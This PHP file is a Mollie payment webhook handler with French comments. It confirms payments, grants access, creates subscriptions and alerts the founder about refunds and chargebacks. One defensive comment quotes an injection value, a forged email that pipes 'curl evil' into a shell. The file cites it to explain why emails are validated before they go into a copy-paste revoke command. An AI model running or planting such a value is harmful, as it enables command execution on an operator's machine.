<?php
// ── Webhook Mollie ────────────────────────────────────────────────────────────
// Mollie POST un SEUL parametre : id=tr_xxx. AUCUNE signature (par design). La
// securite = on RE-FETCH le paiement par id avec NOTRE cle (un id qui n'est pas a
// nous renvoie 404), + idempotence (marqueur fichier) pour ne pas fulfiller 2x.
// NE JAMAIS faire confiance au body ni chercher une signature HMAC : Mollie n'en
// envoie pas, et le statut n'est pas transmis -> un POST forge ne debloque rien.
//
// A 'paid' : forward fulfillment (meme shape que stripe-webhook.php) + (abo) creation
// idempotente de la Subscription. Couvre aussi les renouvellements recurrents (chaque
// paiement genere par la subscription rappelle ce webhook). Mirror de stripe-webhook.php.

ini_set('display_errors', '0');
header('Content-Type: application/json');

if (($_SERVER['REQUEST_METHOD'] ?? 'POST') !== 'POST') { http_response_code(405); echo json_encode(['error' => 'method']); exit; }

$cfg = require __DIR__ . '/mollie-config.php';
require_once __DIR__ . '/mollie-lib.php';

// Mollie envoie application/x-www-form-urlencoded : id=tr_xxx.
$pid = $_POST['id'] ?? '';
$pid = preg_replace('/[^a-zA-Z0-9_]/', '', $pid);
if (!$pid || strpos($pid, 'tr_') !== 0) { http_response_code(200); echo json_encode(['received' => true, 'ignored' => 'no_id']); exit; }

// ── Idempotence : marqueur fichier dans api/data/ (non servi par HTTP) ────────
$dataDir = __DIR__ . '/data';
if (!is_dir($dataDir)) { @mkdir($dataDir, 0755, true); }
$marker = $dataDir . '/mol_' . $pid;
if (file_exists($marker)) {
    // Rappel POST-fulfillment : Mollie rappelle ce webhook a CHAQUE changement du
    // paiement — y compris REMBOURSEMENT et CHARGEBACK. Avant 2026-07-02 cet
    // early-exit avalait le rappel : un rembourse gardait l'acces et le fondateur
    // n'etait jamais prevenu (trou constate sur le remboursement du 01/07, zero
    // trace repo). On repond 200 a Mollie D'ABORD (meme pattern que le chemin
    // principal), puis on re-fetch par id (meme garde "c'est NOTRE paiement") et
    // on detecte amountRefunded/amountChargedBack > 0 → alerte fondateur UNE fois
    // (marqueur molrefund_<pid>). ADDITIF : le fulfillment n'est jamais rejoue,
    // la reponse duplicate est inchangee, aucun acces n'est revoque ici (outil :
    // scripts/automation/revoke-pass.cjs, action tracee).
    http_response_code(200);
    echo json_encode(['received' => true, 'duplicate' => true]);
    ignore_user_abort(true);
    if (function_exists('fastcgi_finish_request')) { @fastcgi_finish_request(); }
    // NB : pas de throttle sur ce re-fetch (envisage, REJETE) — Mollie ne re-tente pas
    // apres un 200, donc un throttle pourrait avaler l'UNIQUE rappel refund legitime ;
    // le cout d'un GET par POST duplique est marginal (le chemin principal re-fetch
    // deja tout pid inconnu). Le marqueur molrefund_ stocke "ref|cb" : un remboursement
    // COMPLEMENTAIRE ou un chargeback ULTERIEUR (montants en hausse) re-alerte.
    $refMarker = $dataDir . '/molrefund_' . $pid;
    list($rcode, $rpay) = mol_api('GET', '/payments/' . rawurlencode($pid));
    if ($rcode < 400 && is_array($rpay)) {
        $refVal = (float)($rpay['amountRefunded']['value'] ?? 0);
        $cbVal  = (float)($rpay['amountChargedBack']['value'] ?? 0);
        $prev   = file_exists($refMarker) ? explode('|', (string)@file_get_contents($refMarker)) : ['0', '0'];
        $grew   = ($refVal > (float)($prev[0] ?? 0)) || ($cbVal > (float)($prev[1] ?? 0));
        if (($refVal > 0 || $cbVal > 0) && $grew) {
            @file_put_contents($refMarker, $refVal . '|' . $cbVal);
            $rcur   = $rpay['amount']['currency'] ?? 'EUR';
            $rmeta  = $rpay['metadata'] ?? [];
            // metadata.email = chaine CLIENT (posee telle quelle par create_payment) →
            // FILTER_VALIDATE_EMAIL OBLIGATOIRE avant de l'embarquer dans une commande
            // copy-paste : htmlspecialchars n'echappe ni ';' ni '|' ni backtick — sans
            // ce garde, un email forge « x@y.z;curl evil|sh » + chargeback fabriquait
            // une commande piegee pour le fondateur/l'agent (panel adverse 2026-07-02).
            $remail = strtolower(trim((string)($rmeta['email'] ?? '')));
            if ($remail !== '' && !filter_var($remail, FILTER_VALIDATE_EMAIL)) $remail = '';
            $lbl    = $cbVal > 0 ? ('CHARGEBACK ' . $cbVal . ' ' . $rcur) : ('remboursement ' . $refVal . ' ' . $rcur);
            mol_founder_alert(
                '🔴 Mollie : ' . $lbl . ' (' . $pid . ')',
                '<p>Paiement <b>' . htmlspecialchars($pid) . '</b> — ' . htmlspecialchars($lbl)
                . ($remail !== '' ? ' — client <b>' . htmlspecialchars($remail) . '</b>' : '') . '.</p>'
                . '<p>Description : ' . htmlspecialchars((string)($rpay['description'] ?? '')) . '</p>'
                . '<p><b>Revoquer l\'acces</b> (pass B2C rembourse) : <code>node scripts/automation/revoke-pass.cjs '
                . ($remail !== '' ? htmlspecialchars($remail) : '&lt;email&gt;') . '</code> (purge comps.php + record serveur) — '
                . 'ou depuis le mobile : GitHub → Actions → &laquo; Revoke pass &raquo; avec le hash sha1 de l\'email (demander a l\'agent).</p>'
            );
        }
    }
    exit;
}

// ── Re-fetch autoritatif par id (= garde "c'est bien NOTRE paiement") ─────────
list($code, $pay) = mol_api('GET', '/payments/' . rawurlencode($pid));
if ($code === 404) { http_response_code(200); echo json_encode(['received' => true, 'ignored' => 'not_ours']); exit; }
if ($code >= 400 || !is_array($pay)) { http_response_code(200); echo json_encode(['received' => true, 'ignored' => 'fetch_failed']); exit; }

$status = $pay['status'] ?? '';
$meta   = $pay['metadata'] ?? [];
$amount = $pay['amount'] ?? [];
$cents  = isset($amount['value']) ? (int)round(((float)$amount['value']) * 100) : null;
$currency = $amount['currency'] ?? 'EUR';
$island = $meta['island'] ?? 'mq';
$plan   = $meta['plan'] ?? ($meta['pass'] ?? 'unknown');
$source = $meta['source'] ?? 'unknown';
$email  = $meta['email'] ?? ($pay['details']['cardHolder'] ?? '');

// ── Paylink B2B annuel (b2b-paylinks.json) ────────────────────────────────────
// L'API payment-links Mollie n'accepte AUCUNE metadata (verifie docs 2026-07-02) :
// un paiement ne d'un lien annuel arrive ici avec metadata VIDE. On le reconnait
// par la description (labels TIERS de mollie-paylinks.cjs, prefixe fixe) + le
// montant de la grille annuelle. NE TOUCHE AUCUN paiement B2C : mollie.php pose
// TOUJOURS une metadata sur les paiements qu'il cree. Email payeur : jamais
// garanti par un paylink (carte → cardHolder = un NOM) → best-effort ci-dessous ;
// FILTER_VALIDATE_EMAIL en aval rejette proprement les non-emails.
$paylinkB2b = null;
if (empty($meta) && preg_match('/^(Sargasses|Sargassum) Pro /', (string)($pay['description'] ?? ''))) {
    $annualGrid = [
        '290.00|EUR'  => 'brief_annual',
        '690.00|EUR'  => 'pro_annual',
        '1990.00|EUR' => 'territory_annual',
        '390.00|USD'  => 'brief_annual_usd',
        '790.00|USD'  => 'pro_annual_usd',
    ];
    $paylinkB2b = $annualGrid[(($amount['value'] ?? '') . '|' . $currency)] ?? 'b2b_paylink';
    $plan   = $paylinkB2b;
    $source = 'paylink_b2b';
    $island = ($currency === 'USD') ? 'florida' : 'mq'; // pilote la LANGUE de l'email (EN si USD)
    foreach ([$pay['billingEmail'] ?? '', $pay['details']['billingEmail'] ?? ''] as $cand) {
        if (is_string($cand) && filter_var(trim($cand), FILTER_VALIDATE_EMAIL)) { $email = strtolower(trim($cand)); break; }
    }
}

// 200 a Mollie AVANT le travail aval (un echec aval ne doit pas provoquer de retry
// infini ; Mollie rappelle de toute facon a chaque changement de statut).
http_response_code(200);
echo json_encode(['received' => true, 'status' => $status]);
ignore_user_abort(true);
if (function_exists('fastcgi_finish_request')) { @fastcgi_finish_request(); }

if ($status === 'paid') {
    @file_put_contents($marker, ''); // marque APRES confirmation 'paid' (les statuts open/pending rappellent)
    // Cas rare : le 'paid' arrive EN RETARD (webhook rate au paiement) et le paiement
    // porte DEJA un remboursement/chargeback → le rappel refund ne reviendra jamais
    // (plus de changement de statut). On alerte ICI depuis le $pay deja fetche (zero
    // appel API en plus, meme marqueur "ref|cb" que la branche duplicate) ET on SAUTE
    // les grants : pas de pass/token/credit parrain pour un paiement deja rembourse
    // integralement ou charge-back (panel adverse 2026-07-02). Le forward fulfillment
    // reste (verite comptable : ce paiement A ETE paye ; la Sheet dedup par id).
    $lateRef = (float)($pay['amountRefunded']['value'] ?? 0);
    $lateCb  = (float)($pay['amountChargedBack']['value'] ?? 0);
    $lateTot = (float)($pay['amount']['value'] ?? 0);
    $lateRevoked = ($lateCb > 0 || ($lateRef > 0 && $lateTot > 0 && $lateRef >= $lateTot));
    if (($lateRef > 0 || $lateCb > 0) && !file_exists($dataDir . '/molrefund_' . $pid)) {
        @file_put_contents($dataDir . '/molrefund_' . $pid, $lateRef . '|' . $lateCb);
        mol_founder_alert(
            '🔴 Mollie : remboursement/chargeback deja present sur paiement ' . $pid,
            '<p>Paiement <b>' . htmlspecialchars($pid) . '</b> arrive paid avec amountRefunded='
            . htmlspecialchars((string)$lateRef) . ' / amountChargedBack=' . htmlspecialchars((string)$lateCb)
            . ($lateRevoked ? ' — <b>grants sautes</b> (rembourse integralement / chargeback).' : ' (partiel : acces accorde normalement).')
            . ' Verifier le dashboard Mollie ; revoquer si besoin (revoke-pass.cjs / Actions &laquo; Revoke pass &raquo;).</p>'
        );
    }
    mol_forward_fulfillment($cfg, $pid, $email, $cents, $currency, $island, $plan, $source);
    if (!$lateRevoked) {
    // PASS one-time : persiste un record Pass côté serveur (cross-device restore via
    // verify_subscription). Même helper partagé que payment_status → ne diverge pas.
    // Idempotent (cumul max(), ne touche pas un abo) ; le marqueur mol_<pid> ci-dessus
    // empêche déjà un 2e passage webhook.
    if (!empty($meta['pass']) && $email) {
        mol_pass_grant_store($email, $meta['pass']);
        mol_pass_grant_once($cfg, $pid, $email, $meta['pass'], $island); // email d'accès INSTANTANÉ (idempotent par pid)
    }
    // Abo : 1er paiement 'first' paye -> cree la Subscription (idempotent).
    if (($meta['kind'] ?? '') === 'sub_first') {
        $cust = $pay['customerId'] ?? '';
        if ($email && $cust) mol_create_subscription_once($cfg, $cust, $email, ($meta['plan'] ?? 'monthly'), $island, $source);
    }
    // B2B : paiement Pro/Brief confirmé (1er paiement OU renouvellement mensuel —
    // nouveau pid à chaque facture) → émet+livre le token Pro (idempotent par pid).
    if (($meta['b2b'] ?? '') === '1' || in_array(($meta['plan'] ?? ''), ['pro_monthly', 'brief_monthly'], true)) {
        mol_b2b_grant_once($cfg, $pid, $email, ($meta['plan'] ?? ''), $island);
    }
    // Paylink B2B ANNUEL (detecte plus haut par description+montant, metadata vide) :
    // avant 2026-07-02 ce paiement etait un TROU NOIR (paiement test fondateur 690 €
    // du 01/07 : aucun email, aucune alerte, aucune trace). Desormais : token Pro
    // livre automatiquement SI un email est present sur le paiement (idempotent par
    // pid), et alerte fondateur DANS TOUS LES CAS (le paylink ne garantit pas
    // d'email → sans email, l'alerte porte le pid + la marche a suivre).
    if ($paylinkB2b !== null) {
        $granted = false;
        if ($email && filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $granted = mol_b2b_grant_once($cfg, $pid, $email, $paylinkB2b, $island);
        }
        mol_founder_alert(
            '🏨 Paiement B2B annuel Mollie : ' . $paylinkB2b . ' (' . ($amount['value'] ?? '?') . ' ' . $currency . ')',
            '<p>Paiement <b>' . htmlspecialchars($pid) . '</b> — ' . htmlspecialchars((string)($pay['description'] ?? '')) . '.</p>'
            . (($email && filter_var($email, FILTER_VALIDATE_EMAIL))
                ? '<p>Email payeur : <b>' . htmlspecialchars($email) . '</b> — token Pro ' . ($granted ? 'envoye automatiquement (espace pro par email).' : 'deja emis pour ce paiement (idempotent).') . '</p>'
                : '<p><b>Aucun email exploitable sur le paiement</b> (limite des payment-links Mollie). Action : retrouver le payeur dans le dashboard Mollie, puis demander a l\'agent d\'emettre son acces Pro avec son email (widget-token / espace pro).</p>')
        );
    }
    // Parrainage : crédite le parrain (referred_by). Idempotent par pid — le marqueur
    // mol_<pid> empêche déjà un 2e passage webhook, et mol_refcredit_grant dédup le pid.
    if (!empty($meta['referred_by'])) mol_refcredit_grant($meta['referred_by'], $pid);
    } // fin !$lateRevoked — grants sautes si deja rembourse integralement / chargeback
} elseif (in_array($status, ['failed', 'canceled', 'expired'], true)) {
    // Echec de paiement (one-time ou facture recurrente) -> trace dunning, meme
    // mapping que stripe-webhook.php (invoice.payment_failed). Pas de marqueur :
    // un retry recurrent ulterieur peut repasser 'paid'.
    mol_forward_fulfillment($cfg, $pid, $email, $cents, $currency, $island, $plan, $source, 'invoice.payment_failed');
}
exit;
